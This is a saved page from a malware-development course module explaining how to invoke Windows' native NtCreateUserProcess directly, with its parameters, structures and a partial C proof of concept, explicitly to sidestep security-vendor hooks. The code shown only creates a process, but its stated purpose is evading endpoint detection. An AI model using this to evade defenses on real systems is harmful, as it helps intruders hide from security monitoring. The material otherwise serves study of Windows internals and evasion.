<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Diving%20Into%20NtCreateUserProcess_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Diving%20Into%20NtCreateUserProcess_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Diving%20Into%20NtCreateUserProcess_files/css2.css" rel="stylesheet">
        <link href="Diving%20Into%20NtCreateUserProcess_files/css2_002.css" rel="stylesheet">
        <title>Diving Into NtCreateUserProcess</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Diving%20Into%20NtCreateUserProcess_files/app.fdbb573b.css"><link rel="stylesheet" href="Diving%20Into%20NtCreateUserProcess_files/app.fdbb573b.css"><link rel="stylesheet" href="Diving%20Into%20NtCreateUserProcess_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Diving%20Into%20NtCreateUserProcess_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 91 - Diving Into NtCreateUserProcess
            </div>
            <div class="ml-2 w-4 h-4 bg-red-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Diving%20Into%20NtCreateUserProcess_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Diving%20Into%20NtCreateUserProcess_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Diving%20Into%20NtCreateUserProcess_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/NtCreateUserProcess" target="_blank">
                    <img src="Diving%20Into%20NtCreateUserProcess_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Diving Into NtCreateUserProcess</h2>
<h3>Introduction</h3>
<p>Up to this point in the course, the <code>CreateProcess</code> WinAPI has been utilized for the creation of new processes. Nevertheless, it is worth noting that the <code>CreateProcess</code> function ultimately invokes <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2288" target="_blank">NtCreateUserProcess</a>
 after executing several internal functions, which may be hooked by 
security vendors. Thus, given the possibility of calling a hooked 
NtCreateUserProcess through <code>CreateProcess</code>, it becomes 
obligatory for us to invoke it directly via direct or indirect syscalls 
as a means of bypassing the potential hook installed.</p>
<p>The following is an image from the <a href="https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals" target="_blank">Windows Internals 7th edition - Part 1</a> book, which shows <code>CreateProcess</code>'s execution flow. Note that functions marked with dotted boxes are internal functions.</p>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-119551140-8b599665-05e6-44b7-829c-fc1d43.jpg" alt="qz"></p>
<p><code>NtCreateUserProcess</code> is the final user-mode accessible function and represents the lowest level <code>CreateProcess</code> can reach before the kernel mode.</p>
<h3>NtCreateUserProcess Parameters</h3>
<p>The <code>NtCreateUserProcess</code> function is a highly customizable function that has multiple parameters and performs complex operations.</p>
<pre><code>NTSTATUS NTAPI NtCreateUserProcess(
    OUT         PHANDLE ProcessHandle,
    OUT         PHANDLE ThreadHandle,
    IN          ACCESS_MASK ProcessDesiredAccess,
    IN          ACCESS_MASK ThreadDesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ProcessObjectAttributes,
    IN OPTIONAL POBJECT_ATTRIBUTES ThreadObjectAttributes,
    IN ULONG    ProcessFlags,                                    // PROCESS_CREATE_FLAGS_*
    IN ULONG    ThreadFlags,                                     // THREAD_CREATE_FLAGS_*
    IN OPTIONAL PRTL_USER_PROCESS_PARAMETERS ProcessParameters,                     
    IN OUT      PPS_CREATE_INFO CreateInfo,
    IN          PPS_ATTRIBUTE_LIST AttributeList
);
</code></pre>
<ul>
<li>
<p><code>ProcessHandle</code> - A pointer to a <code>HANDLE</code> variable that receives the handle of the newly created process.</p>
</li>
<li>
<p><code>ThreadHandle</code> - A pointer to a <code>HANDLE</code> variable that receives the handle to the main thread of the newly created process.</p>
</li>
<li>
<p><code>ProcessDesiredAccess</code> - Determines the granted access to the process handle and is of type <code>ACCESS_MASK</code>. This module will use <code>PROCESS_ALL_ACCESS</code> to grant full access rights to the object.</p>
</li>
<li>
<p><code>ThreadDesiredAccess</code> - Determines the granted access to the thread handle and is of type <code>ACCESS_MASK</code>. This module will use <code>THREAD_ALL_ACCESS</code> to grant full access rights to the object.</p>
</li>
<li>
<p><code>ProcessObjectAttributes</code> - This parameter specifies the attributes that can be applied to the process. The attributes are defined using the <code>OBJECT_ATTRIBUTES</code> structure and are typically initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" target="_blank">InitializeObjectAttributes</a> macro. For this module, this parameter will be set to <code>NULL</code>.</p>
</li>
<li>
<p><code>ThreadObjectAttributes</code> - This parameter specifies the attributes that can be applied to the thread. The attributes are defined using the <code>OBJECT_ATTRIBUTES</code> structure and are typically initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" target="_blank">InitializeObjectAttributes</a> macro. For this module, this parameter will be set to <code>NULL</code>.</p>
</li>
<li>
<p><code>ProcessFlags</code> - This is the flag that determines the 
initial state of the created process. For example, the process could be 
created in a suspended state or could inherit from its parent process. 
In this module, this flag will be set to <code>NULL</code> to indicate that the process should be created in a normal state.</p>
</li>
<li>
<p><code>ThreadFlags</code> - This is the flag that determines the initial state of the main thread. In this module, this flag will be set to <code>NULL</code> to indicate that the thread should be created in a normal state.</p>
</li>
<li>
<p><code>ProcessParameters</code> - An optional parameter, that points to an <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2635" target="_blank">RTL_USER_PROCESS_PARAMETERS</a> structure. This parameter describes the process's initial arguments.</p>
</li>
<li>
<p><code>CreateInfo</code> - This is a pointer to a <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2207" target="_blank">PS_CREATE_INFO</a> structure that will hold returned information about the created process when the function succeeds.</p>
</li>
<li>
<p><code>AttributeList</code> - This is a pointer to a <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2060" target="_blank">PS_ATTRIBUTE_LIST</a>
 structure. The purpose of this parameter is to set up the attributes of
 the created process and thread. Recall that these are the same 
attributes that allow PPID spoofing and block DLL policy.</p>
</li>
</ul>
<p>Note that the process name to be created is passed as an attribute using the <code>AttributeList</code> parameter.</p>
<h3>PS_ATTRIBUTE_LIST AttributeList</h3>
<p>As mentioned above, <code>NtCreateUserProcess</code>'s last parameter is a pointer to a <code>PS_ATTRIBUTE_LIST</code> structure.</p>
<pre><code>typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre>
<ul>
<li>
<p><code>TotalLength</code> - This is always set to the size of the <code>PS_ATTRIBUTE_LIST</code> structure.</p>
</li>
<li>
<p><code>Attributes</code> - An array of <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2048" target="_blank">PS_ATTRIBUTE</a> structure.</p>
</li>
</ul>
<h4>PS_ATTRIBUTE Attributes</h4>
<pre><code>typedef struct _PS_ATTRIBUTE
{
	ULONG_PTR Attribute;
	SIZE_T Size;
	union
	{
		ULONG_PTR Value;
		PVOID ValuePtr;
	};
	PSIZE_T ReturnLength;

} PS_ATTRIBUTE, * PPS_ATTRIBUTE;
</code></pre>
<p>The following elements should be initialized for every attribute added to the process:</p>
<ul>
<li>
<p><code>Attribute</code> - Set to the type of attribute.</p>
</li>
<li>
<p><code>Value</code> - The attribute value.</p>
</li>
<li>
<p><code>Size</code>: The size of the attribute value (size of <code>Value</code>).</p>
</li>
</ul>
<p>The parameters are similar to those used in the <code>UpdateProcThreadAttribute</code> WinAPI function. The main difference is the <code>Attribute</code> member must use one of the values that are specific to the <code>NtCreateUserProcess</code> function. These values are shown below.</p>
<pre><code>// Specifies the parent process of the new process
#define PS_ATTRIBUTE_PARENT_PROCESS \
    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)

// Specifies the debug port to use
#define PS_ATTRIBUTE_DEBUG_PORT \
    PsAttributeValue(PsAttributeDebugPort, FALSE, TRUE, TRUE)

// Specifies the token to assign to the new process
#define PS_ATTRIBUTE_TOKEN \
    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)

// Specifies the client ID to assign to the new process
#define PS_ATTRIBUTE_CLIENT_ID \
    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)

// Specifies the TEB address to use for the new process
#define PS_ATTRIBUTE_TEB_ADDRESS \
    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)

// Specifies the image name of the new process
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)

// Specifies the image information of the new process
#define PS_ATTRIBUTE_IMAGE_INFO \
    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)

// Specifies the amount of memory to reserve for the new process
#define PS_ATTRIBUTE_MEMORY_RESERVE \
    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)

// Specifies the priority class to use for the new process
#define PS_ATTRIBUTE_PRIORITY_CLASS \
    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)

// Specifies the error mode to use for the new process
#define PS_ATTRIBUTE_ERROR_MODE \
    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)

// Specifies the standard handle information to use for the new process
#define PS_ATTRIBUTE_STD_HANDLE_INFO \
    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)

// Specifies the handle list to use for the new process
#define PS_ATTRIBUTE_HANDLE_LIST \
    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)

// Specifies the group affinity to use for the new process
#define PS_ATTRIBUTE_GROUP_AFFINITY \
    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)

// Specifies the preferred NUMA node to use for the new process
#define PS_ATTRIBUTE_PREFERRED_NODE \
    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)

// Specifies the ideal processor to use for the new process
#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)

// Specifies the process mitigation options to use for the new process
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)

// Specifies the protection level to use for the new process
#define PS_ATTRIBUTE_PROTECTION_LEVEL \
    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, FALSE)

// Specifies the UMS thread to associate with the new process
#define PS_ATTRIBUTE_UMS_THREAD \
    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)

// Specifies whether the new process is a secure process
#define PS_ATTRIBUTE_SECURE_PROCESS \
    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)

// Specifies the job list to associate with the new process
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)

// Specifies the child process policy to use for the new process
#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)

// Specifies the all application packages policy to use for the new process
#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)
 
// Specifies the child process should have access to the Win32k subsystem.
#define PS_ATTRIBUTE_WIN32K_FILTER	\
    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)

// Specifies the child process is allowed to claim a specific origin when making a safe file open prompt
#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM	\
    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)

// Specifies the child process is isolated using the BNO framework
#define PS_ATTRIBUTE_BNO_ISOLATION	\
    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)
    
// Specifies that the child's process desktop application policy  
#define PS_ATTRIBUTE_DESKTOP_APP_POLICY	\
    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)
    
</code></pre>
<h3>Initializing PS_ATTRIBUTE_LIST</h3>
<p>In the code snippet below, the <code>PS_ATTRIBUTE_IMAGE_NAME</code> flag is used as the first attribute in the <code>PS_ATTRIBUTE_LIST</code> structure, <code>pAttributeList</code>. This flag represents the attribute that will hold the name of the process. By setting this attribute, the <code>NtCreateUserProcess</code> function is informed about which image to execute, which in this case is specified with the <code>szProcessName</code> variable.</p>
<pre><code>PPS_ATTRIBUTE_LIST  pAttributeList          = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
if (!pAttributeList)
    return FALSE;

// this is always set to the size of the 'PS_ATTRIBUTE_LIST' structure
pAttributeList-&gt;TotalLength                 = sizeof(PS_ATTRIBUTE_LIST);

// the type of the attribute
pAttributeList-&gt;Attributes[0].Attribute     = PS_ATTRIBUTE_IMAGE_NAME;
// the size of the attribute value
pAttributeList-&gt;Attributes[0].Size          = dwProcessNameLength;
// the attribute value
pAttributeList-&gt;Attributes[0].Value         = szProcessName;        
</code></pre>
<h4>Initializing Additional Attributes</h4>
<p>To initialize additional attributes, update the number of elements in the <code>Attributes</code> array.</p>
<pre><code>typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[2];       // updated to fit an additional attribute
    // PS_ATTRIBUTE Attributes[3];    // updated to fit 3 attributes

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre>
<h3>PS_CREATE_INFO CreateInfo</h3>
<p><code>NtCreateUserProcess</code>'s 10th parameter, <code>CreateInfo</code>, is an input and output parameter and a pointer to the <code>PS_CREATE_INFO</code> structure.</p>
<pre><code>typedef struct _PS_CREATE_INFO
{
	SIZE_T Size;
	PS_CREATE_STATE State;
	union
	{
		struct
		{
			union
			{
				ULONG InitFlags;
				struct
				{
					UCHAR WriteOutputOnExit : 1;
					UCHAR DetectManifest : 1;
					UCHAR IFEOSkipDebugger : 1;
					UCHAR IFEODoNotPropagateKeyState : 1;
					UCHAR SpareBits1 : 4;
					UCHAR SpareBits2 : 8;
					USHORT ProhibitedImageCharacteristics : 16;
				} s1;
			} u1;
			ACCESS_MASK AdditionalFileAccess;
		} InitState;

		struct
		{
			HANDLE FileHandle;
		} FailSection;

		struct
		{
			USHORT DllCharacteristics;
		} ExeFormat;

		struct
		{
			HANDLE IFEOKey;
		} ExeName;

		struct
		{
			union
			{
				ULONG OutputFlags;
				struct
				{
					UCHAR ProtectedProcess : 1;
					UCHAR AddressSpaceOverride : 1;
					UCHAR DevOverrideEnabled : 1;
					UCHAR ManifestDetected : 1;
					UCHAR ProtectedProcessLight : 1;
					UCHAR SpareBits1 : 3;
					UCHAR SpareBits2 : 8;
					USHORT SpareBits3 : 16;
				} s2;
			} u2;
			HANDLE FileHandle;
			HANDLE SectionHandle;
			ULONGLONG UserProcessParametersNative;
			ULONG UserProcessParametersWow64;
			ULONG CurrentParameterFlags;
			ULONGLONG PebAddressNative;
			ULONG PebAddressWow64;
			ULONGLONG ManifestAddress;
			ULONG ManifestSize;
		} SuccessState;
	};

} PS_CREATE_INFO, * PPS_CREATE_INFO;
</code></pre>
<h3>Initializing PS_CREATE_INFO</h3>
<p>While the <code>PS_CREATE_INFO</code> structure is large, most of its elements are set by <code>NtCreateUserProcess</code> when it's executed successfully. The only elements that should be initialized before passing the structure to <code>NtCreateUserProcess</code> are the <code>Size</code> and <code>State</code> elements as shown below.</p>
<pre><code>PS_CREATE_INFO CreateInfo = { 0 };

CreateInfo.Size  = sizeof(PS_CREATE_INFO);
CreateInfo.State = PsCreateInitialState;
</code></pre>
<p>The value of the <code>State</code> element is derived from the enumeration below. However, in almost all cases, it is set to <code>PsCreateInitialState</code>.</p>
<pre><code>typedef enum _PS_CREATE_STATE
{
	PsCreateInitialState,
	PsCreateFailOnFileOpen,
	PsCreateFailOnSectionCreate,
	PsCreateFailExeFormat,
	PsCreateFailMachineMismatch,
	PsCreateFailExeName,
	PsCreateSuccess,
	PsCreateMaximumStates

} PS_CREATE_STATE;
</code></pre>
<h3>RTL_USER_PROCESS_PARAMETERS ProcessParameters</h3>
<p>Although the <code>ProcessParameters</code> parameter is designated as an optional parameter, setting it to <code>NULL</code> will result in <code>NtCreateUserProcess</code> failing with <code>0xC0000005</code> or <code>STATUS_ACCESS_VIOLATION</code>. The <code>RTL_USER_PROCESS_PARAMETERS</code> structure is poorly documented by <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters" target="_blank">Microsoft</a> and therefore the structure was retrieved from the <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2635" target="_blank">Process Hacker repository</a>.</p>
<pre><code>typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PWCHAR Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG_PTR EnvironmentSize;
	ULONG_PTR EnvironmentVersion;
	PVOID PackageDependencyData;
	ULONG ProcessGroupId;
	ULONG LoaderThreads;

} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
</code></pre>
<h3>Initilizaing RTL_USER_PROCESS_PARAMETERS</h3>
<p>To initialize the <code>RTL_USER_PROCESS_PARAMETERS</code> structure, the <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2722" target="_blank">RtlCreateProcessParametersEx</a> native function is used.</p>
<pre><code>RtlCreateProcessParametersEx(
    OUT 	PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    IN 		PUNICODE_STRING ImagePathName,
    IN OPTIONAL PUNICODE_STRING DllPath,         // set to NULL
    IN OPTIONAL PUNICODE_STRING CurrentDirectory,
    IN OPTIONAL PUNICODE_STRING CommandLine,
    IN OPTIONAL PVOID Environment,              // set to NULL
    IN OPTIONAL PUNICODE_STRING WindowTitle,    // set to NULL
    IN OPTIONAL PUNICODE_STRING DesktopInfo,    // set to NULL
    IN OPTIONAL PUNICODE_STRING ShellInfo,      // set to NULL
    IN OPTIONAL PUNICODE_STRING RuntimeData,    // set to NULL
    IN ULONG Flags 
);
</code></pre>
<p>The majority of the parameters are optional and can be set to <code>NULL</code>. The important parameters are explained below.</p>
<ul>
<li>
<p><code>pProcessParameters</code> - A pointer to the <code>PRTL_USER_PROCESS_PARAMETERS</code> structure. This is the output of <code>RtlCreateProcessParametersEx</code>.</p>
</li>
<li>
<p><code>ImagePathName</code> - A pointer to a <code>UNICODE_STRING</code> structure that holds the complete path of the image file used to create the process. The provided image path must be in <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c" target="_blank">NT path format</a>. For example, to create <code>C:\\Windows\\System32\\cmd.exe</code>, the path should be prefixed with <code>\\??\\</code> making it <code>\\??\\C:\\Windows\\System32\\cmd.exe</code>. This parameter is shown using Process Hacker in the image below.</p>
</li>
</ul>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-219843832-69179def-33c9-4145-a2cc-5b876d.png" alt="image"></p>
<ul>
<li>
<code>CurrentDirectory</code> - A pointer to a <code>UNICODE_STRING</code>
 structure that holds the current directory path of the created process.
 This parameter is shown using Process Hacker in the image below.</li>
</ul>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-319843814-83b44231-2b26-4236-8764-c0aab5.png" alt="image"></p>
<ul>
<li>
<code>CommandLine</code> - A pointer to a <code>UNICODE_STRING</code> structure that holds the arguments for the created process. This parameter is shown using Process Hacker in the image below.</li>
</ul>
<p><img src="Diving%20Into%20NtCreateUserProcess_files/ntcreateuserprocess-419843782-b85fa358-4019-49dd-856f-605170.png" alt="image"></p>
<ul>
<li>
<code>Flags</code> - This is set to <code>RTL_USER_PROC_PARAMS_NORMALIZED</code> to keep parameters normalized as per Process Hacker's <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2733" target="_blank">note</a>. With that being said, <code>Flags</code> can be set to any of the values below.</li>
</ul>
<pre><code>#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001      // indicates that the parameters passed to the process are already in a normalized form
#define RTL_USER_PROC_PROFILE_USER 0x00000002           // enables user-mode profiling for the process
#define RTL_USER_PROC_PROFILE_KERNEL 0x00000004         // enables kernel-mode profiling for the process
#define RTL_USER_PROC_PROFILE_SERVER 0x00000008         // enables server-mode profiling for the process
#define RTL_USER_PROC_RESERVE_1MB 0x00000020            // reserves 1 megabyte (MB) of virtual address space for the process
#define RTL_USER_PROC_RESERVE_16MB 0x00000040           // reserves 16 MB of virtual address space for the process
#define RTL_USER_PROC_CASE_SENSITIVE 0x00000080         // sets the process to be case-sensitive
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100  // disables heap decommitting for the process
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000  // enables local DLL redirection for the process
#define RTL_USER_PROC_APP_MANIFEST_PRESENT 0x00002000   // indicates that an application manifest is present for the process
#define RTL_USER_PROC_IMAGE_KEY_MISSING 0x00004000      // indicates that the image key is missing for the process
#define RTL_USER_PROC_OPTIN_PROCESS 0x00020000          // indicates that the process has opted in to some specific behavior or feature
</code></pre>
<h3>Creating a Process Using NtCreateUserProcess</h3>
<p>Now that <code>NtCreateUserProcess</code> has been thoroughly 
explained, this section will demonstrate the usage of the function to 
create a process via the custom function <code>NtCreateUserProcessMinimalPoC</code>. Note that <code>PS_ATTRIBUTE_LIST</code> only requires one attribute as shown below.</p>
<pre><code>typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1]; // 1 attribute

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre>
<pre><code>BOOL NtCreateUserProcessMinimalPoC(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {

	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                    = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
